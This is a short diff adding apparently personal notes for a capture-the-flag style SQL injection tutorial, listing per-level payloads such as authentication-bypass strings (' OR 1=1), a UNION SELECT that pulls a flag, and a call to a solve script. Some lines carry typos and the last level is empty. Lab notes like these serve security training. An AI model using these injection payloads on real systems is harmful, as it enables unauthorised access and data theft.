@@ -1,0 +1,19 @@
+->WS_2.01 - SQL Injection tutorial - Level 1
+
+    SELECT * FROM login WHERE password = '' OR '1'='1'
+    ELECT * FROM login WHERE password = 'a' OR 1=1 #'
+    ELECT * FROM login WHERE password = 'a' OR 1=1 --
+    
+    a' OR 1=1 #'    [spoiler voleva solo la parte finale]
+
+->WS_2.01 - SQL Injection tutorial - Level 2
+
+    ' UNION SELECT flag, 2, 3, 4, 5, 6 FROM real_data -- -
+
+->WS_2.01 - SQL Injection tutorial - Level 3
+
+    python solve_WS_2.01.py
+
+->WS_2.01 - SQL Injection tutorial - Level 4
+
+    
